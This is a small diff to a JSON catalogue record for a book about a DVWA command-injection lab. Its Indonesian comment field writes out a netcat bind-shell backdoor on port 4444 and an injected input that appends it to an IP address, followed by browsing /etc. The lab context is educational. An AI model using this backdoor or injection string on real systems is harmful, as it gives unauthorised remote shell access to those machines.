@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/12498?v=1795442916",
   "cover_og_url": "/cover/12498/og?v=1795442916",
+  "has_cover": false,
   "url": "/book/dvwa-command-injection-back-door-onno-widodo-purbo/",
   "rating": null,
   "comment": "Backdoor pada port 4444 menggunakan perintah mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 &gt; /tmp/pipe Dari command injection di DVWA masukan 192.168.43.1;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 &gt; /tmp/pipe dimana 192.168.43.1 adalah salah satu IP mesin di jaringan Selanjutnya kita bisa memasukan perintah2 shell seperti ls cd /etc cat  dsb Ujicoba Percobaan untuk memperoleh shell python",
